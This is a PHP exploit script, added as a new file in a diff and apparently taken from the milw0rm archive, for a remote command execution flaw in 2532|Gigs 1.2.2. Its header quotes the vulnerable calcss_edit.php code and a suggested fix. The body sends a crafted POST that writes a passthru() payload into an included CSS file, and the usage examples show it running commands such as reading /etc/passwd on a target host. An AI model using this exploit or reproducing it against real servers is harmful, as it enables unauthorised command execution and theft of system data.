@@ -1,0 +1,95 @@
+<?php
+
+
+/* ----------------------------------------------------------------
+ * 2532|Gigs 1.2.2 Stable Remote Command Execution Exploit
+ * ----------------------------------------------------------------
+ * by athos - staker[at]hotmail[dot]it 
+ * works regardless php.ini settings
+ * http://www.hotscripts.com/jump.php?listing_id=65863&jump_type=1
+ * ----------------------------------------------------------------
+ * Code Details (calcss_edit.php)
+ *  
+ * 1. <?php
+ * 2. ...
+ * 12. sleep(2);
+ * 13. $id = $_POST["id"];
+ * 14. $content = $_POST["content"];
+ * 15. //lets write the updated CSS file
+ * 16. $filename = "css/calendar.css";
+ * 17. $theText = stripslashes($content);
+ * 18. $data = fopen($filename, "w");
+ * 19. fwrite($data,$content);
+ * 20. fclose($data);
+ * 21. // display the new css file
+ * 22. include("css/calendar.css");
+ * 23 ?>
+ * ----------------------------------------------------------------
+ * Fix
+ * 
+ * <?php
+ * 
+ * if(eregi('calcss_edit.php',$_SERVER['PHP-SELF']))
+ * {
+ *      die("Access Not Allowed");
+ * }
+ * 
+ * ...
+ * ?>
+ * 
+ */
+
+
+
+error_reporting(0);
+
+$host = explode('/',$argv[1]);
+$exec = $argv[2] or usage();
+
+
+$sock = fsockopen($host[0],80);
+
+$post = "content=<?php passthru('{$exec}');?>";
+$leng = strlen($post);
+
+$data = "POST /{$host[1]}/calcss_edit.php HTTP/1.1\r\n".
+        "Host: {$host[0]}\r\n".
+        "User-Agent: Lynx (textmode)\r\n".
+        "Content-Type: application/x-www-form-urlencoded\r\n".
+        "Accept-Encoding: text/plain\r\n".
+        "Content-Length: {$leng}\r\n\r\n{$post}\r\n\r\n";
+
+fputs($sock,$data);
+
+while(!feof($sock)) {
+$html .= fgets($sock);
+} fclose($sock);
+
+echo $html; 
+
+
+
+function usage() {
+
+
+print_r('
+-------------------------------------------------------
+2532|Gigs 1.2.2 Stable Remote Command Execution Exploit
+-------------------------------------------------------
+by athos - staker[at]hotmail[dot]it
+works regardless php.ini settings
+
+Usage: php xpl.php [host/path] [command]
+       php xpl.php localhost/cms cat ../../../etc/passwd
+       php xpl.php localhost/cms "uname -a"
+       
+'); exit(0);
+
+
+
+}
+
+
+?>
+
+# milw0rm.com [2008-12-18]
